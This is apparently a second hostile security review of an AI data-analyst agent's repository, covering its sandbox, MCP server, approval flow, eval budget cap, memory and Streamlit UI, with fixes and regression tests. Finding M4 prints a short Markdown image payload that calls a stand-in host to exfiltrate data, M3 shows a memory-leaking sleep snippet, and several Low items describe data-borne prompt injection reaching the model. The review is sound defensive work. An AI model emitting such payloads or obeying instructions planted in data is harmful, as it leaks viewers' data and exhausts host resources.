# Repository review 2: `fix/review-2`

A second hostile review of `main` at `0f2a5cd` (after integration round 4). It focuses on what
was merged after [review.md](review.md) was written:

- the semantic layer (BM25, embedding and hybrid backends)
- model routing and escalation
- human-in-the-loop approval and the approval broker
- the MCP server
- eval process isolation and the `--budget-usd` cap
- structured reports and insight memory
- observability (trace store, log correlation)
- the samples endpoint
- the Streamlit UI
- the integration glue between them

The format and severity scale are the same as review.md. Every **Medium** finding is fixed on this
branch with a regression test. Each test was run against the old code and fails there (the
command and failure are listed with each fix). **Low** findings are documented with a one-line
reason. One Low (L1) was cheap enough to fix too, with a test.

Severity scale (unchanged):
- **High:** an attacker-controlled input (dataset contents, or model output steered by them)
  reaches the host, secrets or other users' data.
- **Medium:** a realistic input breaks a security control, corrupts a run, or takes down or
  wedges the service.
- **Low:** defence in depth, design limits already documented elsewhere, and code quality.

**No High finding.** The review.md High fixes (H1, H2) still hold: the full sandbox suite, the
seccomp unit tests and the escape tests pass.

## Method

I read every module merged since review.md, plus the integration code that connects them:

- `core/{approval,router,memory,report,tracing,logs,loop}.py`
- `semantic/*`
- `mcp_server.py`
- `eval/{isolation,runner,agent,experiments}.py`
- `api/{app,jobs,store,samples,observability,agent}.py`
- `frontend/*`

Then I probed the system live. All the probe scripts were throwaway, and the probes that found
something became the regression tests below.

| Probe | What ran | Result |
|---|---|---|
| Concurrent jobs and approvals | 6 jobs on 3 workers through the real API, `AgentLoop`, sandbox and `ApprovalBroker`. Approval timeout 1.5 s; 2 jobs approved, 1 denied, 3 left to time out. Trace store, memory and JSON logs on. | Every decision reached the right job (`human` / `human` / `timeout`). Late POSTs got 409. 6 span trees were written, one per job. Every log line from a job carried its `job_id`, and each `run_id` mapped to exactly one `job_id`. |
| Approval timeouts | The same probe, plus reading the code for the resolve-vs-timeout race. | The decision is recorded under the broker lock, so a POST that lands as the timeout fires is either the decision (200) or too late (409), never both. |
| Trace store with many runs | 3,000 saved span trees with 15 turns each (165 MB). | `trace show <run_id>` takes 0.5 s (a full scan) and `trace ls` takes 1.9 s. There is no retention (L5). |
| Memory with changed data | Fingerprints of four CSVs: column `t` or `x`, with one value edited or not. | **M1**: with a column named `t`, the edited file kept its fingerprint. |
| MCP over stdio, malformed input | The real `analyst-agent-mcp` over stdio, sent non-JSON, invalid UTF-8, a JSON array, a request without a method, string `arguments`, `query: 123`, `spec: [1]`, `params: {}` and NaN/Inf results, then a valid call. | It survived everything and answered the valid call. Invalid params got `-32602`. Garbage lines got no reply (L3). Bad argument types came back as tool errors (L4). NaN/Inf were serialised as strings. |
| Samples path traversal | `GET /datasets/{id}` and `POST /ask` with `..`, `%2e%2e%2f`, encoded slashes, absolute paths, and an upload-style id with a trailing newline. | All 404. Sample ids are hashes, looked up in an in-memory map built at start-up; no path is built from the request. |
| Eval timeout kill | A process-isolated eval task whose `run_python` sleeps, killed by the 6 s task timeout. | **M3**: the sandbox child was still running after the kill. |
| Eval budget cap | A process-isolated core agent that pays for one LLM call and then hangs, with `--budget-usd` below that call's cost. | **M2**: the timed-out task recorded `cost_usd = 0`, and the next task started anyway. |
| JSON logs in eval | `eval run --agent dry-run --limit 1` with `AGENT_LOG_JSON_ENABLED=true`. | **L1**: 0 task log lines under `--isolation process`; 12 under `--isolation inline`. |
| UI Markdown surfaces | Every `st.*` call in `frontend/app.py`, checked against Streamlit 1.66's documented Markdown support. | **M4**: `st.metric` renders images in its *value*. |

## Summary

| ID | Sev | Area | Finding | Status |
|---|---|---|---|---|
| M1 | Medium | Correctness: memory | The dataset fingerprint ignores every column but `t` when a table has a column named `t`, and falls back to schema + row count when the checksum fails. Either way, an edited file gets stale insights. | Fixed `822d2cf` |
| M2 | Medium | Reliability: eval budget | `--budget-usd` counts timed-out and crashed tasks as $0, so a run whose tasks time out never stops starting new ones. | Fixed `83b9ebc` |
| M3 | Medium | Reliability: sandbox | When eval kills a timed-out task, its `run_python` child survives (it has its own session), with no wall-clock limit left. The same happens when the API dies. | Fixed `31c5190` |
| M4 | Medium | Security: exfiltration | UI key-number tiles render Markdown images in the *value*, so review M2 reopens at a new surface. | Fixed `87f8353` |
| L1 | Low | Observability | Process-isolated eval tasks write no logs, because forkserver children do not inherit the log handler. | Fixed anyway `f80f303` |
| L2–L16 | Low | various | see below | Documented |

Also on this branch: `eval/experiments.py` branch coverage goes from 83% to 99% (`4526716`), and
every `docs/*.md` file and `README.md` was audited against the code (see
[Docs audit](#docs-audit)).

---

## Medium

### M1 — Insight memory serves stale insights for edited files

`src/analyst_agent/core/memory.py::dataset_fingerprint`

The fingerprint is what keeps memory honest: "changes whenever the data does, so stale insights
from an older version of a file are never retrieved". The content checksum was
`SUM(hash(t)) FROM "<table>" t`. DuckDB resolves `t` to a **column** before the table alias. So
for any table with a column named `t` (or `T`), only that column was hashed.

Confirmed: `t,v\n1,10\n2,20` and `t,v\n1,999\n2,20` got the same fingerprint, `9eb2e2e9…`. The
second run of a question on the edited file is then handed the old run's headline and key numbers
as "prior insights".

There was a second path to the same result. If the checksum query failed (for example the 30 s
SQL timeout on a large table), the code silently fell back to schema + row count only, which an
edited file keeps.

**Fix.** The checksum hashes `row("c1", "c2", …)`, built from every column by its quoted name.
If it cannot be computed, `dataset_fingerprint` raises. The loop already catches that: the run
proceeds without memory and records `memory.error`.

**Tests:** `tests/test_memory.py::test_fingerprint_covers_every_column_whatever_the_names`
(`t`, `T` and `x`; `t` and `T` fail on the old code) and
`::test_fingerprint_fails_closed_when_the_checksum_is_unavailable` (fails on the old code: no
exception).

### M2 — `--budget-usd` does not count tasks that time out or crash

`src/analyst_agent/eval/runner.py::run_task`, `eval/isolation.py`

A task killed on timeout, or one whose process crashed, returns no `AgentOutput`, so `run_task`
recorded `cost_usd = out.cost_usd = 0`. Its LLM calls had still been paid for. With the default
`--timeout 300`, these are usually the most expensive tasks.

`run_tasks` adds each result's `cost_usd` to the run's spend before starting the next task. So
`--budget-usd` (and `run_experiments.sh`'s per-arm caps, which are built on it) never tripped on
them. A run where every task hangs on its second LLM call keeps starting tasks, each burning a
full timeout of spend, however low the cap.

**Fix.**

- `eval/agent.py` adds a per-task `SpendMeter` and `report_spend()`. `_run_core` reports every
  `llm_call`'s cost as it happens, with or without a trace recorder.
- In a process-isolated child, the meter writes to a `multiprocessing.Value` that the parent
  still holds after killing the child. Inline, the meter travels through a context variable.
- `run_task` records the metered spend when the agent returns nothing. A successful task still
  reports its own `CostTracker` total.

**Test:** `tests/eval/test_isolation.py::test_budget_counts_the_spend_of_timed_out_tasks`
(process and inline isolation). It fails on the old code with `assert 0.0 > 0`.

### M3 — The sandbox's Python child outlives an eval task killed on timeout

`src/analyst_agent/sandbox/_child/sitecustomize.py`, `sandbox/python_runner.py`

`run_python` starts its child with `start_new_session=True`, so the runner can `killpg` it on a
timeout. Eval's process isolation kills a timed-out task with `killpg(<task pid>)`; its docstring
says "grandchildren such as the sandbox's Python runner die with it". They did not, because the
sandbox child is in **another** session.

Confirmed: a task whose `run_python` sleeps was killed at 6 s, and the
`bootstrap.py /tmp/analyst-py-…` process was still running afterwards. Its wall-clock limit was
enforced by the task process, which was now dead. `RLIMIT_CPU` does not stop a sleeping process.

So data-steered code such as `x = bytearray(900_000_000); time.sleep(10**9)` leaks up to
`RLIMIT_AS` (1 GiB) per timed-out task, for good. The same happens to every running sandbox
child if the API process dies.

**Fix.** Before any user code runs, the child sets `prctl(PR_SET_PDEATHSIG, SIGKILL)`. It then
exits if its parent pid is no longer the one the runner passed in, which covers a parent that
died before the `prctl`. A failing `prctl` raises inside `sitecustomize`, so the guard never
finishes loading and the bootstrap refuses to run (fail closed).

**Test:** `tests/sandbox/test_python_security.py::test_child_dies_with_its_parent` SIGKILLs a
parent process group in the middle of `run_python`, as eval's isolation does. It fails on the
old code: "the sandbox child outlived its parent".

### M4 — Zero-click exfiltration through key-number tile values

`frontend/app.py::render_report`, `frontend/ui_helpers.py::scalar_numbers`

Review M2 made every Markdown surface in the UI image-inert, including `st.metric` *labels*.
But Streamlit 1.66 documents that `st.metric`'s **value** "can optionally contain GitHub-flavored
Markdown, subject to the same limitations described in the label parameter", and those
limitations allow images.

String `key_numbers` values are model text (steerable by the data) and are clipped to 40
characters. `![](//e.example/?d=42)` fits in 40 characters, and the viewer's browser fetches it
as soon as the report renders.

**Fix.** `scalar_numbers` returns both the label and the value through `safe_md`. `safe_md` moves
to `frontend/ui_helpers.py`, and `render.py` re-exports it.

**Test:** `tests/test_frontend_render.py::test_key_number_tiles_cannot_render_images` parses the
tiles with markdown-it and asserts there are no image tokens. It fails on the old code.

---

## Low

| ID | Area | Finding | Why it is left |
|---|---|---|---|
| L1 | Observability | Under `--isolation process` (the default), eval task children never configured logging, so with `AGENT_LOG_JSON_ENABLED=true` none of the loop or sandbox lines (`task_id`, `run_id`) were written. | **Fixed** (`f80f303`): the parent's format and level are passed to the child. Test: `tests/eval/test_isolation.py::test_process_isolated_tasks_write_correlated_json_logs` (fails on the old code). |
| L2 | Security: MCP | `structuredContent` carries the handler's raw `data` (query rows) **outside** the `wrap_untrusted` fence. A client that shows structured content to its model gets data-borne instructions unfenced. | The text content, which current clients feed to the model, is fenced. Dropping `structuredContent` would break clients that read it; documented in `docs/mcp.md`. |
| L3 | Correctness: MCP | Malformed JSON-RPC lines (non-JSON, invalid UTF-8, arrays) get no `-32700` reply; the MCP SDK drops them. | The server stays up and answers the next valid request (probed). Upstream SDK behaviour. |
| L4 | Correctness: MCP / tools | Tool arguments are not validated against `input_schema`. `run_sql` with `query: 123` returns `run_sql failed: AttributeError …`. | Errors are isolated per call and reported as `isError`. The model sees a clear failure. |
| L5 | Reliability: trace store | No retention: each API job writes a ~55 KB span tree to `AGENT_TRACES_DIR` forever (3,000 jobs = 165 MB). `trace show <run_id>` parses every file (0.5 s at 3,000), and so does `trace ls`. | Opt-in (`AGENT_TRACE_STORE_ENABLED`). Prune with `find -mtime`. An index is a feature. |
| L6 | Reliability: approval | `AGENT_MAX_CONCURRENT_JOBS` jobs waiting on approvals (300 s each by default) occupy every worker, so new jobs queue until they time out. | Bounded by `AGENT_APPROVAL_TIMEOUT_S`. Without auth (review L1) anyone can submit jobs anyway. |
| L7 | Correctness: approval | `POST /jobs/{id}/approve` without `action_id` resolves whatever is pending, so a stale client can approve a newer step it never saw. | The UI always sends `action_id`; the field is documented. Making it required would break simple API clients. |
| L8 | UI | The approval panel shows only `query`/`code`. A budget-triggered gate on `make_chart` or `inspect_schema` is approved without seeing its arguments. | The raw trace tab shows them. Budget gates ask once per run. |
| L9 | Privacy: memory | Memory is one store for every API user. An identical upload, or a shared sample dataset, gets other users' questions and headlines as prior insights, and their questions in the `memory_retrieval` event. | Opt-in, and the API has no users (review L1). The block is fenced and labelled "not instructions". |
| L10 | Eval | Nothing forces memory off in `eval run`: with `AGENT_MEMORY_ENABLED=true` in `.env`, tasks over the same dataset see earlier tasks' findings, which contaminates scores. | `run_experiments.sh` pins it off and `docs/architecture.md` says to keep it off. CI turns it on only in the no-score smoke run. |
| L11 | Semantic layer | Without the `embeddings` extra, the embedding and hybrid backends fail in every run and the run proceeds without metric context (`semantic_error`). With hybrid weight 0 the dense model is still loaded at fit time. | Recorded per run and summarised as "retrieval errors" by `experiments summary`; the runbook covers it. |
| L12 | Routing | Column names (fenced, but data) can nudge the router towards a cheaper tier. | Cost and quality only. Escalation on tool errors and critic revisions backstops it. |
| L13 | Samples | The sample catalog follows symlinks under `AGENT_SAMPLES_DIR`. | Operator-controlled directory. Request paths never reach the filesystem (probed above). |
| L14 | Sandbox | When a parent dies (M3), the dead runner never removes the child's temp dir (`/tmp/analyst-py-*`). | Small (code plus pickled data). The child itself is gone now. |
| L15 | Semantic layer | The embedding encoder loads lazily without a lock, so two concurrent first jobs can each load the model. | Once per process, and only memory. |
| L16 | API | `_register_artifact` copies files from outside the artifacts root to `<job_id>/<basename>`, so two artifacts with the same basename overwrite each other. | The sandbox exporter and `make_chart` name files uniquely. |

Still standing from review.md: L1 (no auth), L14 (one worker per store), L15 (no job-level
wall-clock timeout) and the rest of review.md's Low list. None of this round's fixes change them.

## Docs audit

Every claim in `README.md` and `docs/*.md` (not `docs/kickoff/`, which is historical) was
checked against the code. Fixed statements, by file:

- **`architecture.md`**
  - round 4, not round 3
  - semantic backends
  - metrics ship in the wheel, and the image copies only `benchmarks/data`
  - `barh` inference
  - memory in eval is not enforced off
  - eval report sections
  - the budget behaviour: the old text described a "wrap up" prompt and critic limiting that do
    not exist
  - the ADV data
- **`README.md`**
  - sandbox test count
  - the retrieval row names the 33 *benchmark-task* cases
- **`sandbox.md`**
  - `SandboxSetupError`
  - artifact dir defaults
  - `SANDBOX_FUZZ_WORKERS`
  - the M3 row
- **`sandbox-performance.md`:** repeat counts
- **`benchmark.md`:** data size 1.5 MB
- **`eval-runbook.md`**
  - the judge-less warning is printed, not silent
  - the budget counts timed-out tasks (M2)
- **`observability.md`**
  - the example's prompt versions and durations
  - `--verbose` is `ask` only
  - process-isolated eval logs (L1)
- **`mcp.md`:** DuckDB files and `NAME` handling for multi-table files
- **`report-and-memory.md`:** the fingerprint (M1)
- **`interview-notes.md`**
  - critic rounds 0..N
  - where memory's fence lives
  - CI flag smoke excludes Langfuse and samples
  - pp per task by tier
  - fingerprint
  - which doc states "denials never escalate"
  - UI tile values
- **`integration-notes.md`**
  - three "still open" items marked resolved: UI e2e in CI, the approval status icon, and
    `experiments.py` coverage
- **`review.md`**
  - a status note
  - M2's helpers moved

## Not verified here

- **Docker image, Cloud Run and a real LLM**, as in earlier rounds: no Docker daemon, `ghcr.io`
  blocked, no `ANTHROPIC_API_KEY`.
- **The embedding backends.** The `embeddings` extra was not installed, so only the backend code
  and its fake-encoder tests were reviewed.
- **`PR_SET_PDEATHSIG` under gVisor (Cloud Run gen1).** It is a standard `prctl`. If it fails, the
  sandbox fails closed (the child refuses to run), so a gen1 deploy would show it at once.
